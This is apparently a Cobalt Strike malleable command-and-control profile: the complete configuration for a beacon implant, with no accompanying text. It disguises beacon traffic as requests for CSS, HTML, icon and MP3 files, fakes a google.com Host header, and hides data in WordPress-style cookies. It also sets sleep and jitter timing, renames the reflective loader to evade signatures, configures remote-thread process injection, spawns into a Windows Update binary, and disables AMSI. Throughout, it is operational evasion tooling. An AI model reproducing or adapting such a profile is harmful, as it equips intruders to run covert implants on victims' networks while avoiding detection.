set sample_name "c3a22d29";
set sleeptime "59252";
set jitter "41";
set tcp_port "9904";
set useragent "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202";

set dns_idle "34.168.114.114";
set dns_stager_subhost "ns1.";
set maxdns "240";
set dns_sleep "112";
set dns_ttl "3600";
set dns_max_txt "252";

set pipename "npfs_##";
set pipename_stager "rpc_##";

https-certificate {
	set CN "comsats";
	set O "dep";
	set L "isb";
	set ST "pu";
	set C "pk";
	set validity "20";
}

http-config {
	header "Server" "golfe2";
}

http-get "default" {

	set uri "/RELEASE_NOTES.css /kj.css";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept-Encoding" "gzip";

		metadata {
			mask;
			base64;
			prepend "wordpress_logged_in=";
			header "Cookie";
		}

		parameter "profiler" "false";

	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/css";
		header "Server" "apache";

		output {
			netbios;
			base64;
			prepend "html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-m";
			print;
		}

	}

}
http-post "default" {

	set uri "/copyright";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Content-Type" "text/plain";

		output {
			base64url;
			base64;
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "Pagely Gateway/1.5.1";

		output {
			base64;
			print;
		}

	}

}
http-stager "default" {

	set uri_x86 "/static-directory/tab_shop_active.ico";
	set uri_x64 "/files/fr.ico";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept" "image/jpeg";
		header "Accept-Encoding" "gzip, br";

	}
	server {

		header "Content-Type" "image/x-icon";
		header "Server" "cloudflare";
		header "Connection" "close";

		output {
			print;
		}

	}

}
stage {

	set checksum "4";
	set userwx "false";
	set image_size_x86 "561664";
	set image_size_x64 "540961";
	set sleep_mask "true";
	set cleanup "true";
	set stomppe "true";
	set obfuscate "true";
	set compile_time "08 Jan 2021 13:57:24";
	set entry_point "81369";
	set name "debugsafely.dll";

	transform-x86 {
		prepend "\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "DebugSafely";
	}

	transform-x64 {
		prepend "\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "DebugSafely";
	}

}

process-inject {

	set allocator "VirtualAllocEx";
	set min_alloc "16733";
	set userwx "false";
	set startrwx "false";

	transform-x86 {
		prepend "\x90\x90\x90\x90\x90";
	}
	transform-x64 {
		prepend "\x90\x90\x90\x90\x90";
	}

	execute {
		CreateThread;
		RtlCreateUserThread;
		CreateRemoteThread;
	}

}

post-ex {
	set spawnto_x86 "%windir%\\syswow64\\WUAUCLT.exe";
	set spawnto_x64 "%windir%\\sysnative\\WUAUCLT.exe";
	set obfuscate "true";
	set smartinject "true";
	set amsi_disable "true";
}

http-get "variant_1" {

	set uri "/bn.css /faq.css";

	client {

		header "Host" "google.com";
		header "Connection" "close";

		metadata {
			base64url;
			base64;
			prepend "woocommerce_items_in_cart=";
			header "Cookie";
		}

		parameter "invoice" "true";

	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/css";
		header "Server" "golfe2";

		output {
			base64;
			base64;
			prepend "@import url(/t/1.css?apiType=css&projectid=6e7eef0e-28ec-43c0-a707-f08a1eb1c6b9);@font-face{font-family:'StymieW01-BoldCondensed';src:url('/dv2/2/d06fb800-a3e7-4a04-b8b8-a1f5d23f4439.eot?d44f19a684109620e4841579ae90e818937f0df4d514ffe0d3e3e57723a4125208f710b15d5bd87a20be5922b56a3a06b0f26ae7d930583a24007f936f67b82ff92d0c643f2b648064a59cc1c28679e075ed12931c5b949e1e9478c09bb8b5fb94f462c6c3a419e45e785b0869&projectId=6e7eef0e-28ec-43c0-a707-f08a1eb1c6b9#iefix');src:url('/dv2/2/d06fb800-a3e7-4a04-b8b8-a1f5d23f4439.eot?d44f19a684109620e4841579ae90e818937f0df4d514ffe0d3e3e57723a4125208f710b15d5bd87a20be5922b56a3a06b0f26ae7d930583a24007f936f67b82ff92d0c643f2b648064a59cc1c28679e075ed12931c5b949e1e9478c09bb8b5fb94f462c6c3a419e45e785b0869&projectId=6e7eef0e-28ec-43c0-a707-f08a1eb1c6b9#iefix') format('eot'),url('/dv2/14/917cefa0-8659-4ad4-a4bf-b0ec714d1cfb.woff2?d44f19a684109620e4841579ae90e818937f0df4d514ffe0d3e3e57723a4125208f710b15d5bd87a20be5922b56a3a06b0f26ae7d930583a24007f936f67b82ff92d0c643f2b648064a59cc1c28679e075ed12931c5b949e1e9478c09bb8b5fb94f462c6c3a419e45e785b0869&projectId=6e7eef0e-28ec-43c0-a707-f08a1eb1c6b9') format('woff2'),url('/dv2/3/065df875-84bb-45cd-afa3-d42b170797be.woff?d44f19a684109620e4841579ae90e818937f0df4d514ffe0d3e3e57723a4125208f710b15d5bd87a20be5922b56a3a06b0f26ae7d930583a24007f936f67b82ff92d0c643f2b648064a59cc1c28679e075ed12931c5b949e1e9478c09bb8b5fb94f462c6c3a419e45e785b0869&projectId=6e7eef0e-28ec-43c0-a707-f08a1eb1c6b9') format('woff'),url('/dv2/1/cababd22-b9ea-4e13-90dd-cd914957484d.ttf?d44f19a684109620e4841579ae90e818937f0df4d514ffe0d3e3e57723a4125208f710b15d5bd87a20be5922b56a3a06b0f26ae7d930583a24007f936f67b82ff92d0c643f2b648064a59cc1c28679e075ed12931c5b949e1e9478c09bb8b5fb94f462c6c3a419e45e785b0869&projectId=6e";
			print;
		}

	}

}
http-post "variant_1" {

	set uri "/fam_calendar /favicon";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Content-Type" "text/plain";

		output {
			base64;
			base64;
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "ESF";

		output {
			base64;
			print;
		}

	}

}
http-stager "variant_1" {

	set uri_x86 "/wp-includes/an.mp3";
	set uri_x64 "/static-directory/logo.mp3";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept" "image/jpeg";
		header "Accept-Language" "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5";

	}
	server {

		header "Content-Type" "audio/mpeg";
		header "Server" "golfe2";
		header "Connection" "close";

		output {
			print;
		}

	}

}
http-get "variant_2" {

	set uri "/avatars /language";

	client {

		header "Host" "google.com";
		header "Connection" "close";

		metadata {
			base64;
			base64;
			prepend "HSID=";
			header "Cookie";
		}


	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "nginx";

		output {
			mask;
			base64;
			prepend "<!DOCTYPE html><html class='no-js' lang='en-US'>  <head>    <meta http-equiv='X-UA-Compatible' content='IE=EDGE' />    <meta charset='utf-8'>    <meta name='viewport' content='width=device-width, initial-scale=1' />    <meta name='apple-itunes-app' content='app-id=1089249069'>    <title>Untitled</title><meta name='description' content='";
			print;
		}

	}

}
http-post "variant_2" {

	set uri "/modules /r-arrow";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Content-Type" "application/x-www-form-urlencoded";

		output {
			netbiosu;
			base64;
			prepend "line=";
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "Apache";

		output {
			base64;
			print;
		}

	}

}
http-stager "variant_2" {

	set uri_x86 "/static-directory/gv.jpg";
	set uri_x64 "/files/lu.jpg";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept" "*/*";
		header "Accept-Encoding" "gzip";

	}
	server {

		header "Content-Type" "image/jpeg";
		header "Server" "cloudflare";
		header "Connection" "close";

		output {
			print;
		}

	}

}
http-get "variant_3" {

	set uri "/ab.html /aa.html /ch.html";

	client {

		header "Host" "google.com";
		header "Connection" "close";

		metadata {
			mask;
			base64;
			prepend "wordpress_ed1f617bbd6c004cc09e046f3c1b7148=";
			header "Cookie";
		}


	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "ESF";

		output {
			netbios;
			base64;
			prepend "<!DOCTYPE html><html class='no-js' lang='en-US'>  <head>    <meta http-equiv='X-UA-Compatible' content='IE=EDGE' />    <meta charset='utf-8'>    <meta name='viewport' content='width=device-width, initial-scale=1' />    <meta name='apple-itunes-app' content='app-id=1089249069'>    <title>Untitled</title><meta name='description' content='";
			print;
		}

	}

}
http-post "variant_3" {

	set uri "/profile";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Content-Type" "application/x-www-form-urlencoded";

		output {
			netbios;
			base64;
			prepend "node=";
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "cloudflare";

		output {
			base64;
			print;
		}

	}

}
http-stager "variant_3" {

	set uri_x86 "/files/en.jpg";
	set uri_x64 "/components/da.jpg";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept-Encoding" "gzip, br";
		header "Accept-Language" "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5";

	}
	server {

		header "Content-Type" "image/jpeg";
		header "Server" "cloudflare";
		header "Connection" "close";

		output {
			print;
		}

	}

}
